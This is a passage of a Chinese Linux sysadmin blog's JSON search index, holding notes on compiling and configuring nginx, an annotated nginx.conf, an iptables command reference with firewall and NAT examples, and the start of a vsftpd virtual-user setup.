","date":"2019-04-10","objectID":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:1:0","tags":["linux","nginx"],"title":"Nginx安装维护","uri":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"依赖安装 [root@00 software]# yum install -y gcc glibc gcc-c++ pcre-devel openssl-devel git #安装依赖关系 [root@00 software]# mkdir /opt/software [root@00 software]# cd /opt/software [root@00 software]# wget http://nginx.org/download/nginx-1.14.2.tar.gz # nginx 负载均衡检测模块 # [root@00 software]# git clone https://github.com/yaoweibin/nginx_upstream_check_module.git # vts-status 模块用于替换默认的 http_stub_status_module 启用vts时可以不启用默认的 # [root@00 nginx-1.14.2]# git clone https://github.com/vozlt/nginx-module-vts.git # ","date":"2019-04-10","objectID":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:2:0","tags":["linux","nginx"],"title":"Nginx安装维护","uri":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"编译安装（安装过程若差包直接装上就可以了） [root@00 software]# tar xzvf nginx-1.14.2.tar.gz [root@00 software]# cd nginx-1.14.2 [root@00 nginx-1.14.2]# useradd -d /var/ftproot -s /sbin/nologin www -u 1002 # 负载均衡模块添加,添加对应版本的补丁 # [root@00 nginx-1.14.2]# patch -p1 \u003c ../nginx_upstream_check_module/check_1.14.0+.patch # # 隐藏默认版本号，隐藏默认标识 # sed -i 's#\"1.14.2\"#\"\"#g' ./src/core/nginx.h # sed -i 's#\"NGINX\"#\"0x5c0f\"#g' ./src/core/nginx.h # sed -i 's#\"nginx/\"#\"0x5c0f/\"#g' ./src/core/nginx.h # sed -i 's#\"Server: nginx\"#\"Server: 0x5c0f\"#g' ./src/http/ngx_http_header_filter_module.c # sed -i 's#\u003ccenter\u003enginx\u003c/center\u003e#\u003ccenter\u003e0x5c0f\u003c/center\u003e#g' ./src/http/ngx_http_special_response.c # grep \"0x5c0f\" ./src/http/ngx_http_header_filter_module.c ./src/http/ngx_http_special_response.c ./src/core/nginx.h [root@00 nginx-1.14.2]# ./configure --user=www --group=www --with-http_ssl_module --with-http_stub_status_module --prefix=/opt/nginx-1.14.2 #--with-http_realip_module （建议添加用于日志分析） # --add-module=../nginx_upstream_check_module/ (负载均衡模块编译，新增时注意保留原有参数) # --add-module=../nginx-module-vts/ (负载均衡模块编译，新增时注意保留原有参数) # checking for OS + Linux 2.6.32-71.el6.i686 i686 checking for C compiler ... found + using GNU C compiler + gcc version: 4.4.4 20100726 (Red Hat 4.4.4-13) (GCC) checking for gcc -pipe switch ... found checking for -Wl,-E switch ... found checking for gcc builtin atomic operations ... found checking for C99 variadic macros ... found checking for gcc variadic macros ... found -----忽略部分内容----- nginx path prefix: \"/opt/nginx-1.14.2\" nginx binary file: \"/opt/nginx-1.14.2/sbin/nginx\" nginx modules path: \"/opt/nginx-1.14.2/modules\" nginx configuration prefix: \"/opt/nginx-1.14.2/conf\" nginx configuration file: \"/opt/nginx-1.14.2/conf/nginx.conf\" nginx pid file: \"/opt/nginx-1.14.2/logs/nginx.pid\" nginx error log file: \"/opt/nginx-1.14.2/logs/error.log\" nginx http access log file: \"/opt/nginx-1.14.2/logs/access.log\" nginx http client request body temporary files: \"client_body_temp\" nginx http proxy temporary files: \"proxy_temp\" nginx http fastcgi temporary files: \"fastcgi_temp\" nginx http uwsgi temporary files: \"uwsgi_temp\" nginx http scgi temporary files: \"scgi_temp\" [root@00 software]# make make -f objs/Makefile make[1]: Entering directory `/opt/software/nginx-1.14.2' cc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\ -o objs/src/core/nginx.o \\ src/core/nginx.c -----忽略部分内容----- sed -e \"s|%%PREFIX%%|/opt/nginx-1.14.2|\" \\ -e \"s|%%PID_PATH%%|/opt/nginx-1.14.2/logs/nginx.pid|\" \\ -e \"s|%%CONF_PATH%%|/opt/nginx-1.14.2/conf/nginx.conf|\" \\ -e \"s|%%ERROR_LOG_PATH%%|/opt/nginx-1.14.2/logs/error.log|\" \\ \u003c man/nginx.8 \u003e objs/nginx.8 make[1]: Leaving directory `/opt/software/nginx-1.14.2' [root@00 nginx-1.14.2]# make install make -f objs/Makefile install make[1]: Entering directory `/opt/software/nginx-1.14.2' test -d '/opt/nginx-1.14.2' || mkdir -p '/opt/nginx-1.14.2' test -d '/opt/nginx-1.14.2/sbin' \\ || mkdir -p '/opt/nginx-1.14.2/sbin' ----忽略部分内容----- make[1]: Leaving directory `/opt/software/nginx-1.14.2' [root@00 nginx-1.14.2]# ln -s /opt/nginx-1.14.2/ /opt/nginxssl #创建软连接,用于版本控制,此步骤可以不做 # 负载均衡模块显示配置 # 1. 需要在 upstream 模块中添加检测 # check interval=3000 rise=2 fall=5 timeout=1000 type=http;(每隔3秒检测一次,请求2次正常则标记realserver状态为up,如果检测5次都失败,则标记realserver的状态为down,超过时间为1秒，检查协议为http) # 2. server中添加location (可合并) # location /status { # check_status; # access_log off; # } ","date":"2019-04-10","objectID":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:3:0","tags":["linux","nginx"],"title":"Nginx安装维护","uri":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"启动 [root@00 Desktop]# /opt/nginx/sbin/nginx -t #检查nginx配置是否正确 nginx: the configuration file /opt/nginx-1.14.2/conf/nginx.conf syntax is ok nginx: configuration file /opt/nginx-1.14.2/conf/nginx.conf test is successful [root@00 Desktop]# /opt/nginx/sbin/nginx [root@00 Desktop]# netstat -lntup|grep 80 tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 5181/nginx ","date":"2019-04-10","objectID":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:4:0","tags":["linux","nginx"],"title":"Nginx安装维护","uri":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","整理收集"],"content":"Nginx主配置文件nginx.conf超详细中文详解","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":" 注意 本文原文出自老男孩微信公众号:oldboyedu, 原文连接已经丢失，现收集于网络转载文本，用于个人整理记录 ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:0:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"1. 作者简介 老男孩，北京老男孩IT教育创始人，畅销图书作者，51CTO金牌讲师，16年运维经验及培训经验， IT界顶级Linux集群架构实战与教育专家。 国内IT教育实战心理学运维思想体系创始人，将心理学运维思想大量应用于教学培训实践，成就屌丝无数。所教学生平均就业工资及后期发展速度连续多年在国内同行业排名第一！ 老男孩老师个人博客： http://oldboy.blog.51cto.com http://blog.oldboyedu.com ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:1:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"2. Nginx核心配置文件nginx.conf史上最细中文详解 ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:2:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"2.1. 定义Nginx运行的用户和用户组 user nginx nginx; #改为特殊的用户和组 nginxworker 进程数，即处理请求的进程（熟称负责接客的服务员） worker_processes 8; #初始可设置为CPU总核数 ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:3:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"2.2. cpu亲和力配置，让不同的进程使用不同的cpu worker_cpu_affinity 0001 0010 0100 1000 0001 00100100 1000; ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:4:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"2.3. 全局错误日志定义类型，[ debug|info|notice|warn|error|crit] error_log logs/error.log error; #一定要设置warn级别以上 ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:5:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"2.4. 把进程号记录到文件 pid logs/nginx.pid; #用于管理nginx进程 ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:6:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"2.5. Nginxworker最大打开文件数，可设置为系统优化后的ulimit -HSn的结果 worker_rlimit_nofile 65535; ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:7:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"2.6. IO事件模型与worker进程连接数设置 events { #epoll模型是Linux 2.6以上版本内核中的高性能网络I/O模型 use epoll; #单个worker进程最大连接数 worker_connections 10240; #nginx最大连接数=worker连接数*worker进程数 } ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:8:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"2.7. http模块设置部分 http{ server_tokens off; #隐藏响应header和错误通知中的版本号 include mime.types; #文件扩展名与文件类型映射表 default_type application/octet-stream;#默认文件类型 server_names_hash_max_size 512; #服务域名的最大hash表大小 server_names_hash_bucket_size 128;#服务域名的hash表大小 #开启高效文件传输模式，实现内核零拷贝 sendfile on; #激活tcp_nopush参数可以允许把httpresponse header和文件的开始放在一个文件里发布，积极的作用是减少网络报文段的数量 tcp_nopush on; #激活tcp_nodelay，内核会等待将更多的字节组成一个数据包，从而提高I/O性能 tcp_nodelay on; #连接超时时间，单位是秒 keepalive_timeout 120; #目录列表访问参数，合适http下载，默认关闭。 autoindex off; #读取客户端请求头的超时时间（参看老男孩的书籍理解http协议原理） client_header_timeout 15s; #读取客户端请求主体的超时时间（参看老男孩的书籍理解http协议原理） client_body_timeout 60s; #设定读取客户端请求主体的最大大小。（参看老男孩的书籍理解http协议原理） client_max_body_size 8m; #设置服务器端传送http响应信息到客户端的超时时间 send_timeout 60s; #设定访问日志的日志记录格式，每列细节参考《跟老男孩学linux运维》:Web集群实战 log_format main '$remote_addr - $remote_user$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\"$http_x_forwarded_for\"'; #FastCGI参数是和动态服务器交互起作用的参数 #设定Nginx服务器和后端FastCGI服务器连接的超时时间 fastcgi_connect_timeout 60; #设定Nginx允许FastCGI服务端返回数据的超时时间 fastcgi_send_timeout 60; #设定Nginx从FastCGI服务端读取响应信息的超时时间 fastcgi_read_timeout 60; #设定用来读取从FastCGI服务端收到的第一部分响应信息的缓冲区大小 fastcgi_buffer_size 64k; #设定用来读取从FastCGI服务端收到的响应信息的缓冲区大小以及缓冲区数量 fastcgi_buffers 4 64k; #设定系统很忙时可以使用的fastcgi_buffers大小，推荐大小为fastcgi_buffers *2。 fastcgi_busy_buffers_size 128k; #fastcti临时文件的大小，可设置128-256K fastcgi_temp_file_write_size 128k; #gzip压缩模块部分（此部分对于网站优化极其重要） #开启gzip压缩功能。 gzip on; #设置允许压缩的页面最小字节数，页面字节数从header头的Content-Length中获取。默认值是0，表示不管页面多大都进行压缩。建议设置成大于1K。如果小于1K可能会越压越大。 gzip_min_length 1k; #压缩缓冲区大小。表示申请4个单位为16K的内存作为压缩结果流缓存，默认值是申请与原始数据大小相同的内存空间来存储gzip压缩结果。 gzip_buffers 4 16k; #压缩版本（默认1.1，前端为squid2.5时使用1.0）用于设置识别HTTP协议版本，默认是1.1，目前大部分浏览器已经支持GZIP解压，使用默认即可。 gzip_http_version 1.1; #压缩比率。用来指定GZIP压缩比，1压缩比最小，处理速度最快；9压缩比最大，传输速度快，但处理最慢，也比较消耗cpu资源。 gzip_comp_level 2; #用来指定压缩的类型，“text/html”类型总是会被压缩，这个就是HTTP原理部分讲的媒体类型。 gzip_typestext/plain application/x-javascript text/css application/xml; #vary header支持。该选项可以让前端的缓存服务器缓存经过GZIP压缩的页面，例如用Squid缓存经过Nginx压缩的数据。 gzip_vary on; #反向代理负载均衡设定部分（可选） #upstream表示负载服务器池，定义名字为blog.oldboyedu.com的服务器池 upstream blog.oldboyedu.com { #server是服务器节点起始标签，其后是节点地址，可为域名或IP，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。 ip_hash; #调度算法，默认是rr轮询。 server 172.16.1.7:80 weight=1; server 172.16.1.8:80 weight=1; server 172.16.1.9:80 weight=1 backup; #backup表示热备 } ## 设定基于域名的虚拟主机部分 ###oldboy www web php server server { listen 80; #监听的端口，也可以是172.16.1.7:80形式 server_name www.oldboyedu.comoldboyedu.com; #域名 root html/blog; #站点根目录，即网站程序放的目录 location / { #默认访问的location标签段 index index.php index.htmlindex.htm; #首页排序 } location ~.*.(php|php5)?$ { #符合php扩展名的请求调度到fcgi server fastcgi_pass 127.0.0.1:9000; #抛给本机的9000端口(php fastcgi server) fastcgi_index index.php; #设定动态首页 include fastcgi.conf; #设定和fastcgi交互的相关参数包含文件 } ### 将符合静态文件的图片视频流媒体等设定expries缓存参数，要求浏览器缓存。 location~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ { expires 10y; #客户端缓存上述静态数据10年 } ### 将符合js,css文件的等设定expries缓存参数，要求浏览器缓存。 location~ .*\\.(js|css)?$ { expires 30d; #客户端缓存上述js,css数据30天 } access_log /app/logs/www_access.log main; #根据日志格式记录用户访问的日志 } ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:9:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"2.8. 反向代理负载均衡配置（代理blog.oldboyedu.com服务） server { listen 80; #监听的端口，也可以是172.16.1.7:80形式 server_name blog.oldboyedu.com; #代理的服务域名 location / { #将访问blog.oldboyedu.com的所有请求都发送到upstream定义的服务器节点池。 proxy_passhttp://blog.oldboyedu.com; #在代理向后端服务器发送的http请求头中加入host字段信息，用于当后端服务器配置有多个虚拟主机时，可以识别代理的是哪个虚拟主机。这是节点服务器多虚拟主机时的关键配置。 proxy_set_headerHost $host; #在代理向后端服务器发送的http请求头中加入X-Forwarded-For字段信息，用于后端服务器程序、日志等接收记录真实用户的IP，而不是代理服务器的IP。 proxy_set_header X-Forwarded-For$remote_addr; #设定反向代理与后端节点服务器连接的超时时间，即发起握手等候响应的超时时间。 proxy_connect_timeout60; #设定代理后端服务器的数据回传时间 proxy_send_timeout 60; #设定Nginx从代理的后端服务器获取信息的时间 proxy_read_timeout 60; #设定缓冲区的大小 proxy_buffer_size 4k; #设定缓冲区的数量和大小。nginx从代理的后端服务器获取的响应信息，会放置到缓冲区。 proxy_buffers 4 32k; #设定系统很忙时可以使用的proxy_buffers大小 proxy_busy_buffers_size 64k; #设定proxy缓存临时文件的大小 proxy_temp_file_write_size 64k; #对于以上参数的详细理解可见本文开头图解。 } access_log off; #反向代理如果并发大，务必要关闭日志，否则IO吃紧。 } ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:10:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"2.9. 设定查看Nginx状态的地址 location /status { stub_status on; #开启状态功能 access_log off; #关闭记录日志 auth_basic “Oldboy Server Status”; #设置基本认证提示 auth_basic_user_file conf/htpasswd; #校验密码文件 } ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:11:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"2.10. 设定java程序动静分离反向代理负载均衡配置 #Oldboy Bbs server server { listen 80; #监听的端口，也可以是172.16.1.7:80形式 server_name bbs.oldboyedu.com; #代理的域名 root html/bbs; #程序目录 index index.php index.html index.htm; #所有静态文件由nginx服务处理 location ~.*.(htm|html|gif|jpg|jpeg|png|swf|flv)$ { expires 3650d; } location ~ .*.(js|css)?$ { expires 30d; } #所有java相关扩展名均交由tomcat或resin服务处理。 location ~ .(jsp|jspx|do)?$ { #将访问blog.oldboyedu.com的所有请求都发送到upstream定义的服务器节点池。 proxy_pass http://127.0.0.1:8080; #在代理向后端服务器发送的http请求头中加入host字段信息，用于当后端服务器配置有多个虚拟主机时，可以识别代理的是哪个虚拟主机。这是节点服务器多虚拟主机时的关键配置。 proxy_set_header Host $host; #在代理向后端服务器发送的http请求头中加入X-Forwarded-For字段信息，用于后端服务器程序、日志等接收记录真实用户的IP，而不是代理服务器的IP。 proxy_set_headerX-Forwarded-For $remote_addr; } access_log /app/logs/bbs_access.log main; #记录日志 } } ","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:12:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","运维记事"],"content":"Iptables常用","date":"2019-03-08","objectID":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/","tags":["linux","iptables"],"title":"Iptables常用","uri":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"1. iptables 工作流程 防火墙是一层一层过滤的，实际是按照配置规则的顺序从上到下，从前到后进行过滤的。 如果匹配上规则，即明确表明是阻止还是通过，此时数据包就不在向下进行新的匹配规则了。 如果所有规则中没有明确表明是阻止还是通过这个数据包，也就是没有匹配上的规则，向下进行匹配，直到匹配默认规则得到明确的阻止还是通过. 防火墙的默认规则是对应链的所有的规则执行完成后才会执行。 ","date":"2019-03-08","objectID":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/:1:0","tags":["linux","iptables"],"title":"Iptables常用","uri":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"2. iptables 表和链 4 表: filter 包过滤，用于防火墙规则。 net 地址转换，用于网关路由器。 mangle 数据包修改（QOS），用于实现服务质量。 raw 高级功能，如：网址过滤。 5链: INPUT链 处理输入数据包。 OUTPUT链 处理输出数据包。 PORWARD链 处理转发数据包。 PREROUTING链 用于目标地址转换（DNAT）。 POSTOUTING链 用于源地址转换（SNAT）。 ","date":"2019-03-08","objectID":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/:2:0","tags":["linux","iptables"],"title":"Iptables常用","uri":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"3. iptables 命令 参数 作用 -F 清空所有规则，不会处理默认规则 -X 删除用户自定义的链 -Z 清空链的计数器 -t 指定表(默认filter) -A 添加规则到指定链的结尾(查找对应链，做什么处理) -I 添加规则到指定链的开头(查找对应链，做什么处理) -P 指定协议: all(默认)、tcp、udp、icmp --dport 指定目的端口(端口范围冒号分割,如:80:89) --sport 指定源端口(端口范围冒号分割,如:80:89) -m multiport --dport/--sport 指定匹配多个端口,需配合(--dport -j 行为 ACCEPT(接受)、DROP(丢弃)、REJECT(拒绝:REJECT会反馈给拒绝对象信息) -s 指定源ip地址 -i 指定进入的网卡 -o 指定出去的网卡 -n 以数字形式显示ip和端口(默认主机名、网络名),需配合-L使用 -L 列出所有规则 -D 删除单条规则 --line-number 显示序号 -m state --state new: 已经或将启动新的连接、ESTABLISHED:已建立的连接、 RELATED: 正在启动的新连接、INVALID: 非法或无法识别的 -m limit --limit n/{second/minute/hour} 限制指定时间包的允许通过数量及并发数 --limit-burst [n] 在同一时间内允许通过的请求n个 ","date":"2019-03-08","objectID":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/:3:0","tags":["linux","iptables"],"title":"Iptables常用","uri":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"4. 示例 清空规则、用户自定义链、链的计数器 [root@00 ~]# iptables -F [root@00 ~]# iptables -X [root@00 ~]# iptables -Z 拒绝规则 [root@00 ~]# iptables -t filter -A INPUT -p tcp --dport 22 -j DROP [root@00 ~]# iptables -t filter -A INPUT -s 172.16.80.0/24 -j DROP [root@00 ~]# iptables -t filter -A INPUT -i eth0 -s 172.16.80.0/24 -j DROP [root@00 ~]# iptables -t filter -A INPUT ! -s 172.16.80.0/24 -j DROP # 拒绝非 172.16.80.0/24 网段进行连接(6.x后!放在-s前面) 匹配ICMP类型 [root@00 ~]# iptables -A INPUT -p icmp --icmp-type 8 -j DROP # 8 代表ping [root@00 ~]# iptables -A INPUT -p icmp --icmp-type 8 -s 172.18.80.0/24 -j DROP [root@00 ~]# 允许关联的状态包(如vsftpd服务) [root@00 ~]# iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT [root@00 ~]# iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT nat 共享网络 # 存在固定的外网地址 [root@00 ~]# iptables -t nat -A POSTROUTING -s 10.0.1.0/24 -o eth1 -j SNAT --to-source 172.16.110.131 # -s 10.0.1.0/24 为办公室或IDC内网网段;-o eth1 为网关的外网网卡接口;-j SNAT --to-source 172.16.110.131 是外网网卡的ip地址 # 存在变化的外网地址(伪装) [root@00 ~]# iptables -t nat -A POSTROUTING -s 10.0.1.0/24 -j MASQUERADE nat 端口转发(一对一映射) # 访问 172.16.80.31:2121转发到 172.16.110.131:22 [root@00 ~]# iptables -t nat -A PREROUTING -p tcp -i eth0 -d 172.16.80.31 --dport 2121 -j DNAT --to 172.16.110.131:22 [root@00 ~]# iptables -t nat -I POSTROUTING -d 172.16.110.131 -j SNAT --to-source 172.16.80.31 ","date":"2019-03-08","objectID":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/:4:0","tags":["linux","iptables"],"title":"Iptables常用","uri":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"Vsftpd安装配置","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":" 注意 文章于最后提交日修改过一次，但没有测试，不知道有没有改错 包含虚拟用户和本地用户配置，另还有一个pure-ftp,据说配置便捷不过没有用过 此篇内容就是完全的一个个人记录了，其他人估计是看不懂的。 基础环境: Fedora 25 vsftd 3.0.3 ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:0:0","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1. 安装 vsftpd ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:1:0","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1.1. 虚拟用户 [root@00 ~]# dnf install -y vsftpd 依赖关系解决。 -----省略部分内容----- 运行事务 安装: vsftpd-3.0.3-2.fc25.x86_64 1/1 验证: vsftpd-3.0.3-2.fc25.x86_64 1/1 已安装: vsftpd.x86_64 3.0.3-2.fc25 完毕！ [root@00 vsftpd]# cp -v /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.default [root@00 vsftpd]# grep -v \"#\" /etc/vsftpd/vsftpd.conf.default \u003e/etc/vsftpd/vsftpd.conf # 清空文件注释 此步骤可以不做 ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:2:0","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1.1.1. 创建虚拟用户配置文件 [root@00 vsftpd]# cd /etc/vsftpd [root@00 vsftpd]# vim .vsftpd_login.list #单数行用户名 偶数行密码 vsftpd01 pw01 vsftpd02 pw02 [root@00 vsftpd]# db_load -T -t hash -f .vsftpd_login.list vsftpd_login.db # 加密配置文件 (原配置文件.vsftpd_login.list可以删除，但如果该配置的用户名密码比较重要且不可更改，建议保留备份至其他地方或增加000权限，以备后续增删改用户时无法知道原配已配置用户名密码；/usr/bin/db_dump -d a /etc/vsftpd/vsftpd_login.db 可以反向查询密码,注意执行前最好先将db文件备个份,不要问我为什么,当你把参数写错了的时候你就知道了) [root@00 vsftpd]# file vsftpd_login.db vsftpd_login.db: Berkeley DB (Hash, version 9, native byte-order) [root@00 vsftpd]# chmod 600 vsftpd_login.db ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:2:1","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1.1.2. 创建用于FTP服务存储文件的根目录以及虚拟用户映射的系统本地用户 [root@00 vsftpd]# useradd -u 1010 -d /var/ftproot -s /sbin/nologin www # 指定uid是为了sync使用 [root@00 vsftpd]# chmod -Rf 755 /var/ftproot/ [root@00 vsftpd]# ls -ld /var/ftproot/ drwxr-xr-x. 3 www www 4096 4月 29 11:50 /var/ftproot/ ","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:2:2","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1.1.3. 建立用于支持虚拟用户的PAM认证文件 [root@00 vsftpd]# cd /etc/vsftpd [root@00 vsftpd]# vim /etc/pam.d/vsftpd auth required pam_userdb.so 